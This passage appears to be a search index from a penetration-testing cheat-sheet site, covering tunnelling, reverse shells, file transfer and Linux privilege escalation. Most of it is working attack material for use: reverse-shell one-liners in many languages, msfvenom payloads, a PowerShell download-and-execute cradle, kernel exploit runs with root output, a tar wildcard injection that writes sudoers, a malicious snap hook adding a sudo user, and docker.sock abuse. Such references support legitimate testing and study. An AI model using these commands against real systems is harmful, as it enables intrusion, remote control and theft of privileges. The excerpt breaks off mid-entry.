0.0.0.0 80 fe80::1 80 # 127.0.0.1 4000 127.0.0.1 3000 # 127.0.0.1 4000 udp 127.0.0.1 22 [timeout=1200] # 127.0.0.1 8000 udp 192.168.1.2 8000 udp [src=192.168.1.2,timeout=1200] Remember restart the service: sudo service rinetd restart httptunnel (hts) hts is a the httptunnel server which has an easily installation. sudo apt-get install httptunnel The use is similar a rinetd but the configuration is established by parameters. hts --forward-port localhost:8888 example.com:1234 PLINK.exe Plink is a windows based command line port forwarding tool based on the PuTTY project. Same as SSH has local, remote and dynamic port forwarding. plink.exe -ssh -l &lt;user&gt; -pw &lt;pass&gt; -R &lt;kali-ip&gt;:80:127.0.0.1:80 &lt;kali-ip&gt; plink.exe -ssh -l &lt;user&gt; -pw &lt;pass&gt; -L 127.0.0.1:80:test.com:80 test.com plink.exe -ssh -l &lt;user&gt; -pw &lt;pass&gt; -D 5566 test.com Warning: May be in a Reverse Shell the command doen’t works so you need to pipe to: cmd.exe c echo y | plink.exe -ssh ..... NETSH netsh utility is installed by default on every modern version of Windows. netsh interface portproxy add v4tov4 listenport=4455 listenaddress=10.0.0.1 connectport=445 connectaddress=192.168.0.1 protocol=tcp We can check currents portproxy with: netsh interface portproxy show v4tov4 By default, Windows will block our connections with the Firewall, being administrator we can easily add a rule to let the traffic pass. netsh advfirewall firewall add rule name=\"forward_port_rule\" protocol=TCP dir=in localip=10.0.0.1 localport=4455 action=allow To delete a portproxy we can use the follwoing command: netsh interface portproxy delete v4tov4 listenaddress=10.0.0.1 listenport=4455 Doble Tunneling Sometimes in Internal Penetration test we can find the following scenario, where we need to access to a network NET3. Kali has access to NET1. SRV1 has access to NET2. SRV2 has access to NET3. We can access to NET2 via creating a dynamic SSH Tunnel (SOCKS4) from a host on NET1 which have access to NET2 such as SRV1. SRV1 does not have access to NET3. To access to NET3 we need to create a dynamic SSH Tunnel to SRV2, which we don’t have access directly from Kali. SSH Dynamic Port Forwarding Create a Port forwarding From Kali to SRV1 redirecting the SSH port of SRV2 to a local port such as 9998. root@kali~:$ ssh -L 9998:SRV2:22 -N user@SRV1 And finally create the dynamic SSH tunnel to SRV2. root@kali~:$ ssh -N -D 5566 -p 9998 user@localhost Final graph where we can see what we do with the tunnels. SSH Local Port Forwarding To forward only one port we can do a double Local port forwarding. user@SRV1~:$ ssh -N -L 9999:SRV3:80 user@SRV2 root@kali~:$ ssh -N -L 9999:localhost:9999 user@SRV1 Now port 9999 of the kali is the port 80 of SRV3."
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-reverse-shell": {
						"id": "post-exploitation-reverse-shell",
						"title": "Reverse Shell",
						"category": "",
						"url": " /post-exploitation/reverse-shell/",
						"content": "To gain control over a compromised system, an attacker usually aims to gain interactive shell access for RCE. A reverse shell is a connection back that means that the victim connects to the attacker. Be careful with Firewalls, use common ports like 80,443 or 445. Online Reverse Shell Generators: https: www.revshells.com Windows Nishang Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. Import-Module .\\Invoke-PowershellTcp.ps1 Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PORT] Or you can modify the script and append the following line: Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PORT] And execute directly from memory: start b powershell IEX(New-Object Net.WebClient).downloadString('http: ip-addr:port Invoke-PowerShellTcp.ps1') Be careful, migrate the process to the same machine architecture! Binary With msfvenom we can create a windows tcp reverse shell. msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f exe -o tmp rev.exe Netcat Netcat is a network tool that allows through a command interpreter and with a simple syntax to open TCP UDP ports in a HOST. It’s not native from windows, so you need to trasnfer the binary. nc.exe -e powershell.exe [IP] [PORT] Be careful, migrate the process to the same machine architecture! Powershell Also we can get a reverse shell without using any external file. powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('ip-addr',port);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2&gt;&amp;1 | Out-String ); $sendback2 = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII ).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c lient.Close()\" We can also use msfvenom hta-psh reverse shell. $ msfvenom -p windows shell_reverse_tcp LHOST=10.10.10.10 LPORT=443 -f hta-psh [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 324 bytes Final size of hta-psh file: 6638 bytes &lt;script language=\"VBScript\"&gt; window.moveTo -4000, -4000 Set bwtVGMW = CreateObject(\"Wscript.Shell\") Set tycIa5Pq = CreateObject(\"Scripting.FileSystemObject\") For each path in Split(bwtVGMW.ExpandEnvironmentStrings(\"%PSModulePath%\"),\";\") If tycIa5Pq.FileExists(path + \"\\..\\powershell.exe\") Then bwtVGMW.Run \"powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQAHQAcgBdADoAO.... Powercat Powercat is the netcat version written in powershell. Remember first download the script and import the module. powercat -c ip-addr -p port -e cmd.exe Meterpreter First, we need to create our shellcode with msfvenom: msfvenom -p windows meterpreter reverse_tcp --platform windows -a x86 --encoder x86 shikata_ga_nai -f exe LHOST=[IP] LPORT=[PORT] &gt; meterpreter.exe After transfer our shellcode to the target machine, we will start listening with metasploit at the same port: msf&gt; use multi handler msf&gt; set PAYLOAD windows meterpreter reverse_tcp msf&gt; set LPORT [PORT] msf&gt; set LHOST [IP] msf&gt; run When we execute our shellcode we will receive the meterpreter in the handler: .\\meterpreter.exe Be careful, migrate the process to the same machine architecture! Migrating the reverse shell From Powershell: [Environment]::Is64BitOperatingSystem [Environment]::Is64BitProcess If they don’t sahre the same architecture, we will need to create a new Revershell with the appropiate Powershell path: For 32 bits: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe For 64 bits: C:\\Windows\\SysNative\\WindowsPowerShell\\v1.0\\powershell.exe From Meterpreter: First we need to list all processes: meterpreter &gt; ps Afther getting the list of all the processs going on we can migrate ourselves to some reliable process: meterpreter &gt; migrate PID Linux There are many ways to get a reverse shell in many differents languages and using many differents binaries. Bash bash -i &gt;&amp; dev tcp 10.0.0.1 8080 0&gt;&amp;1 Perl perl -e 'use Socket;$i=\"10.0.0.1\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\"&gt;&amp;S\");open(STDOUT,\"&gt;&amp;S\");open(STDERR,\"&gt;&amp;S\");exec(\" bin sh -i\");};' Python python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\" bin sh\",\"-i\"]);' PHP php -r '$sock=fsockopen(\"10.0.0.1\",1234);exec(\" bin sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3\");' Ruby ruby -rsocket -e'f=TCPSocket.open(\"10.0.0.1\",1234).to_i;exec sprintf(\" bin sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%d\",f,f,f)' Netcat nc -e bin sh 10.0.0.1 1234 rm tmp f;mkfifo tmp f;cat tmp f| bin sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt; tmp f Socat socat TCP4:10.0.0.1:1234 EXEC: bin bash SSL Socat Using cryptography helps to evade some types of IDS. First we need to create the certificates in out attacking machine. openssl req -newkey rsa:2048 -nodes -keyout rev_shell.key -x509 -days 362 -out rev_shell.crt cat rev_shell.key rev_shell.crt &gt; rev_shell.pem After that on the target machine run socat with OPENSSL: socat OPENSSL:10.0.0.1:443,cert=rev_shell.pem,verify=0 EXEC: bin bash Improve the rev shell to TTY python3 -c 'import pty; pty.spawn(\" bin bash\")' Run to background with Ctrl + Z stty raw -echo;fg export TERM=xterm-265color Don’t use tmux and rlwrap if you want better results. References: https: ironhackers.es herramientas reverse-shell-cheat-sheet https: www.sniferl4bs.com 2017 04 hacking-101-reverse-shell-bind-shell.html https: securityhacklabs.net articulo accediendo-remotamente-a-windows-10-con-metasploit https: www.youtube.com watch?v=fIGvOGrdxyc\\&amp;t=164s https: github.com samratashok nishang"
					}

					
				
			
		
			
				
					,
					

					"post-exploitation-transfering-files": {
						"id": "post-exploitation-transfering-files",
						"title": "Transfering Files",
						"category": "",
						"url": " /post-exploitation/transfering-files/",
						"content": "In this section I’m going to enumerate difference methods to transfer files such us exploits or outputs of some scripts from our attacker machine to the target and viceversa. In order to perform our work we have the need of transfer some files and this post collects some of this methods. Let’s see, these are some possibilities of environment that we can find during our audits. Linux 📤 to Linux 📥 HTTP First we need to start our server with python: python3 -m http.server port python -m SimpleHTTPServer port php -S 0.0.0.0:port ruby -run -e httpd . -p port busybox httpd -f -p port And download our files with Linux basics on the target: wget http: ip-addr:port file.name curl http: ip-addr:port file.name -o file.name axel -a -n 20 -o file.name https: ip-addr:port filen.name #Freebsd fetch -o file.name -q -R http: ip-addr:port file.name Netcat Socat There are more ways with different protocols or programs to transfer our files: nc -lp port &gt; file.name sudo socat TCP4-LISTEN:port,fork file:file.name And on the target: nc -w 3 ip-addr port &lt; file.name sudo socat TCP4:ip-addr:port file:file.name,create FTP (File Transfer Protocol) First we need to start our ftp server, in this case I will use the Python module pyftpdlib, that allows you to set up our ftp server very quickly. To install you run the following command: sudo apt-get install python-pyftpdlib And start the server: python -m pyftpdlib -p 21 Finally you can download the file on the target with: wget ftp: ip-addr file.name [--ftp-user=user] [--ftp-password=password] axel -a -n 20 -o file.name ftp: ip-addr:port filen.name Base64 Encoding This is not the best solution beause you will need to Copy &amp; Paste the output, and if you need to transfer a big file could be so tedious. Btw this are the commands: base64 file.name Copy the result and paste on your machine inside some quotes: base64 -d \"ZmxhZ3tINGNrMW5nTjB0ZXN9Cg==\" &gt; file.name Linux 📤 to Windows 📥 HTTP First we need to start our server with python: python3 -m http.server port python -m SimpleHTTPServer port And download our files with Windows basics on the target: Via CMD: certutil -urlcache -f \"http: ip-addr:port file.name\" file.name powershell -c (New-Object Net.WebClient).DownloadFile('http: ip-addr:port file.name', 'file.name') Via Powershell: (New-Object Net.WebClient).DownloadFile('http: ip-addr:port file.name', 'file.name') Import Powershell Script without storing in memory iex (New-Object System.Net.Webclient).DownloadString('http: ip-addr:port file.ps1') iex (iwr 'http: ip-addr:port file.ps1') SMB Server Message Block (SMB) is a network protocol that allows us share files, printers, etc, between nodes that are Microsoft Windows. To start a smb server you need to invoke smbserver.py class from impacket. python smbserver.py NAME FOLDER And simply copy the file in the share volume to the target: copy \\\\ip-addr\\NAME\\file.name .\\file.name Maybe there are some others ways to transfer files between Linux and Windows, but with these methods is more than enough to do our job! Windows 📤 to Linux 📥 This section will be similar to previous one. HTTP If the target have python installed you can start the server in the same way: (Be careful on windows the python script in python2.7 is http.server and not SimpleHTTPServer) python -m http.server And download our files with Linux basics on the target: wget http: ip-addr:port file.name curl http: ip-addr:port file.name -o file.name SMB In that case the smb server will also start on the attacker’s machine (Linux). To start a smb server you need to invoke smbserver.py class from impacket: python smbserver.py NAME FOLDER But the differece will be the order of copy arguments: copy .\\file.name \\\\ip-addr\\NAME\\file.name Powercat Powercat is essentially the powershell version of netcat. First need to install in yout kali Machine to download the script: Installation: sudo apt install powercat Then you will find the script in the following directory: usr share windows-resources powercat powercat.ps1 Onced transfered the script and imported the module, start the listener on the kali nc -lp port &gt; file.name And execute the following command to send the desired file. powercat -c ip-addr -p port -i file.name Windows 📤 to Windows 📥 SMB First we need to create a password protected shared. New-SmbShare -Name \"share\" -Path C:\\Users\\user\\Desktop\\share -FullAccess Everyone New-SmbShare -Name \"share\" -Path C:\\Users\\user\\Desktop\\share -FullAccess corp\\User Once the shared the new share we need to mount it on the target machine. net use Z: \\\\10.10.10.10\\share user:user password persistent:yes Note: If an error such as The local device name is already in use. you can delete it with: net use Z: delete Finally we can list and use files: dir Z:\\ copy . file.txt Z:\\file.txt References: https: ironhackers.es cheatsheet transferir-archivos-post-explotacion-cheatsheet https: guide.offsecnewbie.com transferring-files https: medium.com @PenTest_duck almost-all-the-ways-to-file-transfer-1bd6bf710d65"
					}

					
				
			
		
			
				
					,
					

					"privilege-escalation-linux-privesc": {
						"id": "privilege-escalation-linux-privesc",
						"title": "Linux Privesc",
						"category": "",
						"url": " /privilege-escalation/linux-privesc/",
						"content": "Privilege Escalation usually involves going from a lower permission to a higher permission. Enumeration Scripts: There are some scripts that could help us in order to escalate privilege on Linux systems. These are two examples: LinEnum: https: github.com rebootuser LinEnum LinPEAS: https: github.com carlospolop privilege-escalation-awesome-scripts-suite tree master linPEAS Kernel Vulnerabilities We can exploit some kernel vulnerabilities in order to privesc. linux-exploit-suggester.sh is an amazing script that do this work. https: github.com mzet- linux-exploit-suggester . linux-exploit-suggester.sh Compiling Exploits Sometimes we need to compile our exploits in order to get the binary or executable. For 64-bits: gcc exploit.c -o exploit For 32-bits: gcc -m32 exploit.c -o exploit #i686 and older devices gcc -march=i686 -m32 -Wl,--hash-style=both exploit.c -o exploit Finally we just need to give execution permissions. chmod u+x executablename . executablename DirtyPipe - Linux Kernel &lt;= 5.8 DirtyPipe allows overwriting data in arbitrary read-only files that leverages to a privilege escalation due to unprivileged process can inject code into root processes. It is similar to DirtyC0w. Download the exploit from the following repository https: github.com Arinerron CVE-2022-0847-DirtyPipe-Exploit blob main compile.sh. Compile it: gcc exploit.c -o dirtypipe Transfer the exploit to the target machine and execute it. . dirtypipe root .ssh authorized_keys 1 $'\\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCo4ILTzBpODN8ubP+Qe3rhWgiPQqldRbCkkdcQb3vChet2SIVr3dM4Y5RQ11cYas1+bPT99nEuu++G7SiEN3juWhK3ymb9g+vC3DdACQbxsUhG4octS1K1N3D4grijfH9YfDoYW37VafhNE6PBa2mZu8KMBlTYRLOw1fP02ncZt0PFiYS0tD2lrKvr2nFBNDrJhRtHtMf6YUjlLEb7p2br z4P40z0vNr2YpEDpTEorW6RTZ802DlinSMpCdkt\\n' https: dirtypipe.cm4all.com https: github.com rahul1406 cve-2022-0847dirtypipe-exploit eBPF_verifier - Linux Kernel &lt; 4.13.9 $ gcc cve-2017-16995.c -o cve-2017-16995 $ chmod +x cve-2017-16995 $ . cve-2017-16995 [.] [.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t) [.] [.] ** This vulnerability cannot be exploited at all on authentic grsecurity kernel ** [.] [*] creating bpf map [*] sneaking evil bpf past the verifier [*] creating socketpair() [*] attaching bpf backdoor to socket [*] skbuff =&gt; ffff88002dc42800 [*] Leaking sock struct from ffff88003d00d400 [*] Sock-&gt;sk_rcvtimeo at offset 472 [*] Cred structure at ffff8800354a0600 [*] UID from cred structure: 33, matches the current: 33 [*] hammering cred structure at ffff8800354a0600 [*] credentials patched, launching shell... # id uid=0(root) gid=0(root) groups=0(root),33(www-data) https: www.exploit-db.com exploits 45010 DirtyC0w - Linux Kernel 2.6.22 &lt; 3.9 DirtyPipe allows overwriting data in arbitrary read-only files that leverages to a privilege escalation. gcc -pthread dirty.c -o dirty -lcrypt Transfer the exploit to the target machine. chmod +x dirty . dirty https: github.com FireFart dirtycow blob master dirty.c Mempodipper - Linux Kernel 2.6.39 &lt; 3.2.2 (Gentoo Ubuntu x86 x64) $ gcc mempodipper.c -o mempodipper $ chmod +x mempodipper $ . mempodipper =============================== = Mempodipper = = by zx2c4 = = Jan 21, 2012 = =============================== [+] Waiting for transferred fd in parent. [+] Executing child from child fork. [+] Opening parent mem proc 1977 mem in child. [+] Sending fd 3 to parent. [+] Received fd at 5. [+] Assigning fd 5 to stderr. [+] Reading su for exit@plt. [+] Resolved exit@plt to 0x8049520. [+] Calculating su padding. [+] Seeking to offset 0x8049514. [+] Executing su with shellcode. # whoami root # https: www.exploit-db.com exploits 18411 Abusing SUID GUID Files Check for files with the SUID GUID bit set. This means that the file or files can be run with permissions of the file(s) owner group. In case of super-user, we can leverage this to get a shell with these privileges. But when a special permission is given to each user it becomes SUID or SGID. When a extra bit “4” is set to user (Owner) it becomes SUID (Set user ID) and wen bit “2” is set to group it becomes SGID (Set Group ID). SUID: rws-rwx-rws GUID: rwx-rws-rwx Permission On Files On Directories SUID Bit User executes the file with permissions of the file owner. - SGID Bit User executes the file with the permission of the group owner. File created in directory gets the same group owner. Sticky Bit - Users are prevented from deleting files from others users. Finding SUID GUID Binaries: find -perm -u=s -type f 2&gt; dev null find -perm -g=s -type f 2&gt; dev null Exploiting PATH Variable PATH is an environmental variable in Linux and Unix-like operating systems which specifies directories that hold executable programs. When the user runs any command in the terminal, it searches for executable files with the help of the PATH Variable in response to commands executed by a user. How does this let us escalate privileges? Let’s say we need an SUID binary. Running it, we can see that it’s calling the system shell to do a basic process like list processes with “ps”. We can rewrite the PATH variable to a location of our choice. So when the SUID binary calls the system shell to run an executable, it runs one that we have written instead. So we need to change the PATH variable: export PATH= tmp echo $PATH And create a file with execution permissions with the same binary name: echo \" bin bash\" &gt; tmp ps bin chmod +x tmp ps Finally when the SUID files calls ps function, instead of showing system processes will execute our command. Remember: To exploit PATH variable we need a SUID File to gain privileges otherwise it will be executed as normal user. Writeable Folders We can elevate our privileges some times when we have write permissions in some specific directories. Note: With write permissions on the folder we can create delete move files but not modify them. On PATH variable When we can write on folders such as usr local bin usr bin or some others that are included on the PATH variable we can escalate our privileges by modifying or creating a new binary that will be executed as root. SSH port open When we ssh a machine root executes run-parts binary so we add a malicious binary on the path. Look Executing files with root to see which binary we can fit our needs. Abusing Wildcards (*) Tar Argument Injection in root cronjob Imagine you compromise a low-level user on a system and you figure out this command is running as root: cd var log mon &amp;&amp; tar -zcf tmp mon.tar.gz * We want to go with sudoers file as we are lazy and just sudo bash, so let’s see…. echo 'echo \"user ALL=(root) NOPASSWD: ALL\" &gt; etc sudoers' &gt; privesc.sh echo \"\" &gt; \"--checkpoint-action=exec=sh privesc.sh\" echo \"\" &gt; --checkpoint=1 Writeable etc passwd The etc passwd file stores essential information, which is required during login. In other words, it stores user account information. if we have a writable etc passwd file, we can write a new line entry allowing us to log in as our own root user. But first, we need to create a compliant password hash. openssl passwd -1 -salt [username] [password] openssl passwd [password] Finally append the following string to etc passwd file: [USERNAME]:[HASH]:0:0:root: root: bin bash And finally su to this new user to obtain a root shell: su [USERNAME] GTFOBins GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions. Firstly, we need to check the sudo permissions on binaries: sudo -l After that search on GTOBins web to search how to escape from that binary and obtain a shell: https: gtfobins.github.io User user may run the following commands on armageddon: (root) NOPASSWD: usr bin someBinary Remember: Do not forget to run the command as sudo! SETENV permission This mean that we can set some environment variables to run the command. User user may run the following commands on admirer: (ALL) SETENV: opt scripts some.py Search for a library, create a copy in tmp and execute commands. some.py import sys sys.exit(10) We can create a sys.py file on tmp. import os def exit(a): os.system(\"cp bin bash tmp rev\") os.system(\"chmod u+s tmp rev\") Finally open the backdoor. tmp rev -p rev-4.4# id uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user) Snap install User user may run the following commands on armageddon: (root) NOPASSWD: usr bin snap install * When we find the following, we can install any malicious packet, so we will add our malicious personal crafted snap packet. https: ubuntu.com tutorials create-your-first-snap#3-building-a-snap-is-easy https: shenaniganslabs.io 2019 02 13 Dirty-Sock.html mkdir privesnap cd privesnap snapcraft init touch snap hooks install We need to create a malicious snap hooks install file, and modify snap snapcraft.yaml install #! bin bash # dirty_sock:dirty_sock useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s bin bash usermod -aG sudo dirty_sock echo \"dirty_sock ALL=(ALL:ALL) ALL\" &gt;&gt; etc sudoers snapcraft.yaml name: privesnap version: '0.1' summary: Empty snap, used for exploit description: | See https: github.com initstring dirty_sock grade: devel confinement: devmode parts: my-part: plugin: nil Linux Capabilities Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation. getcap -r 2&gt; dev null Check the following link to see what means each capability: https: man7.org linux man-pages man7 capabilities.7.html#:~:text=Starting%20with%20kernel%202.2%2C%20Linux,are%20a%20per%2Dthread%20attribute. Note: ep capability means that can read and write any file on the filesystem. More info in: https: linux-audit.com linux-capabilities-101 Exploiting Crontab The Cron daemon is a long-running process that executes commands at specific dates and times. You can use this to schedule activities, either as on-time events or as recurring tasks. To view what cronjobs are active we need to cat the etc crontab file: cat etc crontab If we find a script that is scheduled to run as user root and we can write to this file, we can modify it to get a reverse shell when the cronjob run the task. Abusing privileges (Group memberships) sudo Thats it, you’re already root: sudo su - lxd A member of the local “lxd” group can instantly escalate the privileges to root on the host operating system. This is irrespective of whether that user has been granted sudo rights and does not require them to enter their password. The vulnerability exists even with the LXD snap package. With Internet lxc init ubuntu:16:04 myimage -c security.privileged=true lxc config device add myimage whatever disk source= path= mnt root recursive=true lxc start test lxc exec test bash Without Internet Build an Alpine image and start it using the flag security.privileged=true, forcing the container to interact as root with the host filesystem. # build a simple alpine image git clone https: github.com saghul lxd-alpine-builder cd lxd-alpine-builder sed -i 's,yaml_path=\"latest-stable releases $apk_arch latest-releases.yaml\",yaml_path=\"v3.8 releases $apk_arch latest-releases.yaml\",' build-alpine sudo . build-alpine -a i686 Also you can download directly the image from ubuntu: wget http: cloud-images.ubuntu.com xenial current xenial-server-cloudimg-amd64-root.tar.xz wget http: cloud-images.ubuntu.com xenial current xenial-server-cloudimg-amd64-lxd.tar.xz And exploit it: # import the image lxc image import . alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail. lxc image import xenial-server-cloudimg-amd64-*.tar.xz --alias myimage # Or this depending if you downloaded # before running the image, start and configure the lxd storage pool as default lxd init # run the image lxc init myimage mycontainer -c security.privileged=true # mount the root into the image lxc config device add mycontainer mydevice disk source= path= mnt root recursive=true # interact with the container lxc start mycontainer lxc exec mycontainer bin sh adm All members of the group admin have access to logs files: var log disk All members of the gorup disk have full access to the filesystem. df -h #search disk debugfs dev sda1 debugfs: cd root debugfs: cat root .ssh id_rsa debugfs: cat etc shadow We can also write files on the filesystem. debugfs -w dev sda1 debugfs: dump file1.txt file2.txt #Copy file1.txt to file2.txt Hint: Files owned by root are now writable such as etc passwd or etc shadow. video The video group has access to view the screen output of all opened sessions (tty). With w command we can see the who is logged on the server: moshe@falafel: var log$ w 17:35:42 up 3:40, 3 users, load average: 0.22, 0.09, 0.08 USER TTY FROM LOGIN@ IDLE JCPU PCPU WHAT yossi tty1 13:55 3:40m 0.05s 0.04s -bash moshe pts 0 10.10.14.20 17:18 0.00s 0.08s 0.00s w moshe pts 1 10.10.14.20 17:18 15:17 0.03s 0.03s bash So we need to grab the video output and graphics configuration. moshe@falafel: var log$ cat dev fb0 &gt; tmp screen.raw moshe@falafel: var log$ cat sys class graphics fb0 virtual_size 1176,885 Finally we can open the data with GIMP. docker Since we are member of docker group, we can mount the root filesystem of the host machine to an instance’s volume. $ docker image ls REPOSITORY TAG IMAGE ID CREATED SIZE ubuntu latest 775349758637 22 months ago 64.2MB alpine latest 965ea09ff2eb 22 months ago 5.55MB centos latest 0f3e07c0138f 23 months ago 220MB $ docker run -it --rm -v : mnt &lt;imagename&gt; chroot mnt bash # Edit etc passwd to get root access to the host We can also mount the filesystem and the network access. $ docker run --rm -it --pid=host --net=host --privileged -v : mnt &lt;imagename&gt; chroot mnt bashbash Docker Breakout Privileged Flag enabled When we start a docker with the privileged flag --privileged , we give the sufficient permission to mount the host filesystem inside the docker. When the root user is owned, we will search the host drive: fdisk -l After finding the Linux sda we will mount it: mkdir -p mnt host_drive mount dev sda1 mnt host_drive Finally, just cd to out new mount point to find all host files. Docker.sock available By default, when the docker command is executed on a host, an API call to the docker daemon is made via a non-networked UNIX socket located at var run docker.sock. However, many containers and guides require you to expose this socket file as a volume within a container or in some cases, expose it on a TCP port. Docker containers that expose var run docker.sock, locally or remotely, could lead to a full environment take over. Check if socket is available ls -alh var run docker.sock List all containers curl -ik --unix-socket var run docker.sock http: &lt;docker_host&gt;:PORT containers json Create an exec curl -ik -X POST --unix-socket var run docker.sock -H \"Content-Type: application json\" --data-binary '{\"AttachStdin\": true,\"AttachStdout\": true,\"AttachStderr\": true,\"Cmd\": [\"cat\", \" etc passwd\"],\"DetachKeys\": \"ctrl-p,ctrl-q\",\"Privileged\": true,\"Tty\": true}' http: &lt;docker_host&gt;:PORT containers &lt;container_id&gt; exec Start the exec curl -ik -X POST --unix-socket var run docker.sock -H \"Content-Type: application json\" --data-binary '{\"Detach\": false,\"Tty\": true} http: &lt;docker_host&gt;:PORT exec &lt;exec_id&gt; start' https: dejandayoff.com the-danger-of-exposing-docker.sock USBCreator D-Bus A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the sudoer group to bypass the password security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – without supplying a password. gdbus call --system --dest com.ubuntu.USBCreator --object-path com ubuntu USBCreator --method com.ubuntu.USBCreator.Image root .ssh id_rsa id_rsa true https: unit42.paloaltonetworks.com usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop Executing files with root Adding a new SUDOER user (Bash) We can create a new user and add it to the sudoers file: #! bin bash useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s bin bash usermod -aG sudo dirty_sock echo \"dirty_sock ALL=(ALL:ALL) ALL\" &gt;&gt; etc sudoers Creating a SUID shell (bash) We can copy the bash file to temp and give it SUID permissions. cp bin bash tmp bash chmod u+s tmp bash tmp bash -p Creating a SUID file (c) #include &lt;unistd.h&gt; int main() { setreuid(0,0); execl(\" bin bash\", \"bash\", (char *)NULL); return 0; } Creating a SUID shell (C) We can write the following C code in order to obtain a bash shell: #include &lt;stdio.h&gt; #include &lt;unistd.h&gt; int main (void) { char *argv[] = { \" bin bash\", \"-p\", NULL }; execve(argv[0], argv, NULL); } We just need to compile and give SUID permissions from root in our attacking machine. gcc -m32 shell.c -o shell root@kali $ chmod +s shell Finally we need to transfer the file with the command execution. tmp shell -p Capabilities Capabilities are those permissions that divide the privileges of kernel user or kernel level programs into small pieces so that a process can be allowed sufficient power to perform specific privileged tasks. Search files with capabilities: getcap -r 2&gt; dev null Python Capability python3 -c 'import os; os.setuid(0); os.system(\" bin bash\")' References: https: github.com swisskyrepo PayloadsAllTheThings blob master Methodology%20and%20Resources Linux%20-%20Privilege%20Escalation.md https: sushant747.gitbooks.io total-oscp-guide content privilege_escalation_-_linux.html https: payatu.com guide-linux-privilege-escalation https: www.hackingarticles.in lxd-privilege-escalation https: int0x33.medium.com day-67-tar-cron-2-root-abusing-wildcards-for-tar-argument-injection-in-root-cronjob-nix-c65c59a77f5e https: book.hacktricks.xyz linux-unix privilege-escalation https: unit42.paloaltonetworks.com usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop https: www.hackingarticles.in linux-privilege-escalation-using-capabilities"
					}

					
				
			
		
			
				
					,
					

					"privilege-escalation-run-commands-as": {
						"id": "privilege-escalation-run-commands-as",
						"title": "Run Commands As",
						"category": "",
						"url": " /privilege-escalation/run-commands-as/",
						"content": "Some times we need to do a lateral or vertical movement between the same hosts only switching between local users, and we cant use any type of authenticated service such as SMB or SSH. Linux Linux has the easiest way to change between users using the su command. su user To change to root user (need to be in sudoer group) sudo su - Windows Cmd runas command gives us the oportunity in cmd the opportunity to run some commands as other users. runas user:username &lt;program&gt; runas user:domain\\username &lt;program&gt; runas user:username@domain &lt;program&gt; PsExec PsExec is part of a growing kit of Sysinternals command-line tools that aid in the administration of local and remote systems named PsTools. psexec.exe accepteula psexec.exe [\\\\COMPUTER] u USER p PASS cmd [args] Powershell $user='WORKGROUP\\User'; $pass='passwd'; Invoke-Command -ScriptBlock { iex(New-Object Net.WebClient).DownloadString('http: &lt;IP&gt;:&lt;PORT&gt; rev_shell.ps1') } -ComputerName BART -Credential (New-Object System.Management.Automation.PSCredential $user,(ConvertTo-SecureString $pass -AsPlainText -Force)) NetBSD Similar like sudo su user Similar like sudoto change to rootuser: doas -u USER sh"
					}

					
				
			
		
			
				
					,
					

					"privilege-escalation-windows-privesc": {
						"id": "privilege-escalation-windows-privesc",
						"title": "Windows Privesc",
						"category": "",
						"url": " /privilege-escalation/windows-privesc/",
